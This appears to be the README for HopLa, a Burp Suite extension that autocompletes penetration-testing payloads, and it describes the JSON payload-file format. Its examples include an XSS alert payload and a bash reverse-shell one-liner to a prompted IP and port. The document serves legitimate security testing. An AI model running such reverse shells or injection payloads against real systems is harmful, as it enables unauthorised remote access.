## Getting started


### Installation

 * Download the jar file from the release directory
 * Add it to Burp Suite using the Extender tab

### Build

Execute `gradle build` and you'll have the plugin ready in `releases/HopLa.jar`.

## Usage

By default HopLa is shipped with default payloads. You can add yours by loading a custom JSON file in the the menu. 

At the first usage HopLa creates a JSON file containing all the payloads in the jar file directory.

Press `Ctrl+Q` to display the payload library menu.

You can disable the global autocompletion in the top menu.

For i3, add the following line to `$HOME/.config/i3/config` for floating frame:

```
for_window [class=".*burp-StartBurp.*" title="^ $"] floating enable
```

### How to add payloads

The JSON payloads file follow the structure:

```json
{
    "categories": [
        {
            "name": "XSS",
            "values": [
                {
                    "name": "Simple",
                    "value": "<script>alert(1)</script>"
                },
                {
                    "name": "Multiline",
                    "value": "AAAA\nBBBB"
                },
                {
                    "name" : "Nested XSS menu",
                    "values": [
                        {
                            "name": "Simple 2",
                            "value": "<script>alert(1)</script>"
                        }
                    ]
                }
            ]
        }
    ],
    "keywords": [
        {
            "name": "Headers",
            "values": [
                "X-Forwarded-For",
                "X-Originally-Forwarded-For",
                "X-Originating-Ip",
                "X-Originating-IP"
            ]
        }
    ]
}
```
There is no nesting limit.

You can automatically add a prompt dialog:
```json
{
    "name":  "Bash UDP",
    "value":  "sh -i >& /dev/udp/¬ßIP¬ß/¬ßPORT¬ß 0>&1",
    "prompt": ["IP","PORT"]
},
```

To add only keywords that do not appear in the menu, you can add them in the keywords category:

```json
{
    "keywords": [
        {
            "name": "Headers",
            "values": [
                "X-Forwarded-For",
                "X-Originally-Forwarded-For",
                "X-Originating-Ip",
                "X-Originating-IP"
            ]
        }
    ]
}
```
